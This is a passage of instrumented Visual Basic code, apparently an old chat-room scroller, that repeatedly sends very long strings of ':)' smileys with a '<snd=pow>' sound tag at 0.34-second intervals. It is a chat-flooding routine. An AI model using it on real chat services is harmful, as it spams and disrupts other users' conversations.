If vbwTraceLine Then vbwExecuteLine False, "124    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
124    SendChat ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")

' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "125    pause 0.34"
' </VB WATCH>
125    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "126    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
126    SendChat ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "127    pause 0.34"
' </VB WATCH>
127    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "128    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
128    SendChat ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "129    pause 0.34"
' </VB WATCH>
129    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "130    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
130    SendChat ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "131    pause 0.34"
' </VB WATCH>
131    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "132    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
132    SendChat ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "133    pause 0.34"
' </VB WATCH>
133    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "134    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
134    SendChat ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "135    pause 0.34"
' </VB WATCH>
135    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "136    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
136    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "137    pause 0.34"
' </VB WATCH>
137    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "138    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
138    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "139    pause 0.34"
' </VB WATCH>
139    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "140    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
140    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "141    pause 0.34"
' </VB WATCH>
141    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "142    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
142    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "143    pause 0.34"
' </VB WATCH>
143    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "144    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
144    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "145    pause 0.34"
' </VB WATCH>
145    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "146    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
146    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "147    pause 0.34"
' </VB WATCH>
147    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "148    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
148    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "149    pause 0.34"
' </VB WATCH>
149    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "150    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
150    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "151    pause 0.34"
' </VB WATCH>
151    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "152    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
152    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "153    pause 0.34"
' </VB WATCH>
153    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "154    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
154    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "155    pause 0.34"
' </VB WATCH>
155    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "156    chatsend (" & Chr(34) & "<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :[...]"
' </VB WATCH>
156    ChatSend ("<snd=pow>:) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :):) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :) :)")
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "157    pause 0.34"
' </VB WATCH>
157    Pause 0.34
' <VB WATCH>
If vbwTraceLine Then vbwExecuteLine False, "158    chatsend (" & Chr(34) & "<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ " & Chr(34) & ")"
' </VB WATCH>
158    ChatSend ("<snd=pow>:) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ :) :-/ ")
' <VB WATCH>
